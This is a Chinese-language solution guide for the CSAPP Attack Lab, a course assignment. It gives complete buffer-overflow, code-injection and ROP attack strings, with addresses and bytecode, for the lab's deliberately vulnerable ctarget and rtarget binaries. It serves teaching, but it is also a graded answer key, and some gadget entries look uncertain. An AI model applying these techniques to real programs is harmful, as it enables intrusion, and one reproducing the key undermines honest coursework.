# CSAPP Attack Lab 完成指南

本指南帮助你完成 Attack Lab 的5个阶段，从基础缓冲区溢出到高级 ROP 攻击。

## 实验概述

| 信息 | 值 |
|------|------|
| **你的 Cookie** | `0x3d9549ca` |
| **Cookie 字符串** | `3d9549ca` (用于 touch3) |
| **Cookie ASCII** | `33 64 39 35 34 39 63 61 00` |

---

## 关键地址汇总

从反汇编文件中提取的地址：

| 函数/位置 | 地址 | 说明 |
|-----------|------|------|
| `getbuf` | `0x40167f` | 缓冲区大小 0x18 = **24 字节** |
| `touch1` | `0x401695` | Phase 1 目标 |
| `touch2` | `0x4016c1` | Phase 2/4 目标 |
| `touch3` | `0x4017ad` | Phase 3/5 目标 |

---

## Phase 1: 基础缓冲区溢出 (10分)

**目标**: 让 `getbuf` 返回时跳转到 `touch1` 而非 `test`

### 原理
```
栈布局（高地址在上）：
┌─────────────────┐
│   返回地址       │ ← 需要覆盖为 touch1 地址 (0x401695)
├─────────────────┤
│                 │
│   buf[24]       │ ← getbuf 的缓冲区 (24字节)
│                 │
└─────────────────┘ ← %rsp
```

### 完整攻击字符串

创建文件 `ctarget.l1.txt`：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* 24字节填充 */
95 16 40 00 00 00 00 00  /* touch1地址 0x401695 (小端序) */
```

### 测试
```bash
./hex2raw < ctarget.l1.txt > ctarget.l1
./ctarget -i ctarget.l1
```

### 预期输出
```
Cookie: 0x3d9549ca
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: ...
```

---

## Phase 2: 代码注入带参数 (25分)

**目标**: 调用 `touch2(cookie)`，需注入代码设置 `%rdi = 0x3d9549ca`

### 注入代码

创建 `inject2.s`：
```asm
movq    $0x3d9549ca, %rdi    # 设置参数为你的cookie
pushq   $0x4016c1            # push touch2地址
ret                          # 跳转到touch2
```

### 编译获取字节码
```bash
gcc -c inject2.s
objdump -d inject2.o
```

得到字节码：
```
48 c7 c7 ca 49 95 3d    # movq $0x3d9549ca, %rdi
68 c1 16 40 00          # pushq $0x4016c1
c3                      # ret
```
共 13 字节

### 获取缓冲区起始地址

用 GDB 调试找到 `buf` 的地址：
```bash
gdb ctarget
(gdb) break getbuf
(gdb) run
(gdb) stepi  # 执行到 sub $0x18, %rsp 之后
(gdb) print /x $rsp
```

假设得到的栈地址为 `0x5561dc78`（实际值请以你运行时获得的为准）

### 完整攻击字符串

创建文件 `ctarget.l2.txt`：
```
48 c7 c7 ca 49 95 3d 68  /* movq + pushq开头 */
c1 16 40 00 c3 00 00 00  /* touch2地址 + ret + 填充 */
00 00 00 00 00 00 00 00  /* 填充到24字节 */
78 dc 61 55 00 00 00 00  /* 返回地址：缓冲区起始(替换为你的实际地址) */
```

> [!IMPORTANT]
> 上面的 `78 dc 61 55` 需要替换为你在 GDB 中获得的实际栈地址（小端序）。

### 测试
```bash
./hex2raw < ctarget.l2.txt > ctarget.l2
./ctarget -i ctarget.l2
```

### 预期输出
```
Cookie: 0x3d9549ca
Touch2!: You called touch2(0x3d9549ca)
Valid solution for level 2 with target ctarget
PASS: ...
```

---

## Phase 3: 代码注入带字符串 (25分)

**目标**: 调用 `touch3(cookie_string)`，需传递 cookie 字符串的指针

### 关键点

> [!CAUTION]
> `hexmatch` 会在栈上写入数据，可能覆盖你的 cookie 字符串！
> 必须将字符串放在返回地址**之后**的位置。

### 栈布局
```
┌─────────────────┐ 高地址
│  cookie字符串    │ ← buf+24+8 = buf+32 处
├─────────────────┤
│  返回地址        │ ← buf+24 处，指向 buf 起始
├─────────────────┤
│  注入代码        │ ← buf 起始
│  + 填充          │
└─────────────────┘ 低地址 (%rsp)
```

### Cookie 字符串的 ASCII 值
```
'3' = 0x33, 'd' = 0x64, '9' = 0x39, '5' = 0x35
'4' = 0x34, '9' = 0x39, 'c' = 0x63, 'a' = 0x61
'\0' = 0x00
```

### 计算字符串地址

假设缓冲区起始为 `0x5561dc78`：
- 返回地址位置: `0x5561dc78 + 24 = 0x5561dc90`
- 字符串位置: `0x5561dc90 + 8 = 0x5561dc98`

### 注入代码

创建 `inject3.s`：
```asm
movq    $0x5561dc98, %rdi    # 字符串地址（需替换为实际值）
pushq   $0x4017ad            # push touch3地址
ret
```

字节码：
```
48 c7 c7 98 dc 61 55 68  # movq + pushq开头
ad 17 40 00 c3           # touch3地址 + ret
```

### 完整攻击字符串

创建文件 `ctarget.l3.txt`：
```
48 c7 c7 98 dc 61 55 68  /* movq $0x5561dc98, %rdi + pushq开头 */
ad 17 40 00 c3 00 00 00  /* touch3地址 + ret + 填充 */
00 00 00 00 00 00 00 00  /* 填充到24字节 */
78 dc 61 55 00 00 00 00  /* 返回到注入代码 */
33 64 39 35 34 39 63 61  /* cookie字符串 "3d9549ca" */
00                       /* 字符串结束符 */
```

> [!IMPORTANT]
> 需要根据实际栈地址调整:
> - 第1行的 `98 dc 61 55` 改为 `栈起始+32` 的地址
> - 第4行的 `78 dc 61 55` 改为栈起始地址

### 预期输出
```
Cookie: 0x3d9549ca
Touch3!: You called touch3("3d9549ca")
Valid solution for level 3 with target ctarget
PASS: ...
```

---

## Phase 4: ROP 攻击 touch2 (35分)

**目标**: 用 ROP gadgets 对 `rtarget` 实现 `touch2(cookie)` 调用

### 可用 Gadgets (从 rtarget 的 gadget farm 提取)

| 地址 | 字节码 | 指令 |
|------|--------|------|
| `0x401853` | `58 90 94 c3` | `popq %rax; nop; ?? c3` (注意: 从0x401853开始是58) |
| `0x401863` | `58 c3` | `popq %rax; ret` ✓ |
| `0x40185a` | `48 89 c7 c3` | `movq %rax, %rdi; ret` ✓ |
| `0x401868` | `48 89 c7 c3` | `movq %rax, %rdi; ret` ✓ |

让我们仔细分析 gadget farm 中的函数:

```
setval_219 @ 0x40185f:  c7 07 98 d2 58 c3  -> 包含 58 c3 (popq %rax; ret) @ 0x401863
setval_422 @ 0x401858:  c7 07 48 89 c7 c3  -> 包含 48 89 c7 c3 (movq %rax,%rdi; ret) @ 0x40185a
setval_246 @ 0x401866:  c7 07 48 89 c7 c3  -> 包含 48 89 c7 c3 (movq %rax,%rdi; ret) @ 0x401868
```

**使用的 Gadgets:**
1. `popq %rax; ret` @ `0x401863` (从 setval_219 中)
2. `movq %rax, %rdi; ret` @ `0x40185a` 或 `0x401868`

### ROP Chain 思路
```
[24字节填充]
[0x401863]       <- popq %rax; ret
[0x3d9549ca]     <- cookie值 (被pop到%rax)
[0x40185a]       <- movq %rax, %rdi; ret (%rdi = cookie)
[0x4016c1]       <- touch2地址
```

### 完整攻击字符串

创建文件 `rtarget.l2.txt`：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* 24字节填充 */
63 18 40 00 00 00 00 00  /* gadget1: popq %rax; ret @ 0x401863 */
ca 49 95 3d 00 00 00 00  /* cookie值 0x3d9549ca */
5a 18 40 00 00 00 00 00  /* gadget2: movq %rax,%rdi; ret @ 0x40185a */
c1 16 40 00 00 00 00 00  /* touch2地址 0x4016c1 */
```

### 测试
```bash
./hex2raw < rtarget.l2.txt > rtarget.l2
./rtarget -i rtarget.l2
```

### 预期输出
```
Cookie: 0x3d9549ca
Touch2!: You called touch2(0x3d9549ca)
Valid solution for level 2 with target rtarget
PASS: ...
```

---

## Phase 5: ROP 攻击 touch3 (5分)

**目标**: 用 ROP chain 调用 `touch3(cookie_string_addr)`

> [!WARNING]
> 这是最难的一关！需要8个gadgets，因为需要动态计算栈上字符串的地址。

### 核心难点

栈地址随机化，无法硬编码字符串地址。需要：
1. 获取当前 `%rsp` 值
2. 加上偏移量得到字符串地址
3. 将地址传给 `%rdi`

### 额外可用 Gadgets

| 地址 | 字节码 | 指令 |
|------|--------|------|
| `0x40189c` | `58 89 e0 c3` | (从setval_155) 包含 `movq %rsp, %rax` |
| `0x401900` | `48 89 e0 c2...` | `movq %rsp, %rax` @ 0x401900 |
| `0x401935` | `48 89 e0 c3` | `movq %rsp, %rax; ret` @ 0x401935 |
| `0x401887` | `48 8d 04 37 c3` | `lea (%rdi,%rsi,1), %rax; ret` (add_xy) |
| `0x40188e` | `89 d6...` | `movl %edx, %esi` |
| `0x4018d2` | `89 c1...` | `movl %eax, %ecx` |

实际来看 mid_farm 到 end_farm 区间含:
- `add_xy` @ 0x401887: `lea (%rdi,%rsi,1), %rax; ret`
- 需要找 `movq %rsp, %rax`, `movl %eax, %edx`, `movl %edx, %ecx`, `movl %ecx, %esi` 等

### 一种可能的 ROP Chain

由于这个阶段较复杂，以下是参考思路：

```
1. movq %rsp, %rax     # 保存当前栈指针到 rax
2. movq %rax, %rdi     # rdi = rsp (保存rsp值)
3. popq %rax           # rax = offset (从栈上读取偏移量)
   [offset值]
4-6. 通过寄存器传递把偏移量移到 %rsi
7. lea (%rdi,%rsi,1), %rax  # rax = rsp + offset = 字符串地址
8. movq %rax, %rdi     # rdi = 字符串地址
9. [touch3地址]
10. [cookie字符串]
```

> [!TIP]
> 这一关分值较低(5分)，如果时间紧张可以先跳过。

---

## 调试技巧

### GDB 常用命令

```bash
gdb ctarget
(gdb) break getbuf
(gdb) run < exploit-raw.txt
(gdb) info registers          # 查看所有寄存器
(gdb) print /x $rsp           # 查看栈指针
(gdb) x/20xg $rsp             # 查看栈内容(8字节格式)
(gdb) disas getbuf            # 反汇编函数
(gdb) stepi                   # 单步执行(汇编级)
```

### 常见错误

| 错误 | 原因 | 解决 |
|------|------|------|
| Segmentation fault | 地址错误 | 检查小端序和地址计算 |
| FAIL: just wrong | 参数值不对 | 检查 cookie 值 |
| Misfire | 调用成功但验证失败 | 确认 cookie 正确 |

---

## 提交

完成所有阶段后，将二进制文件放入 `~/Desktop/attacklab/`:

```bash
mkdir -p ~/Desktop/attacklab
cp ctarget.l1 ctarget.l2 ctarget.l3 rtarget.l2 rtarget.l3 ~/Desktop/attacklab/
```

然后点击"提交评测"按钮。

---

## 参考资料

- [CMU Attack Lab 官方文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
- README.md 中的附录 A (hex2raw) 和附录 B (生成字节码)
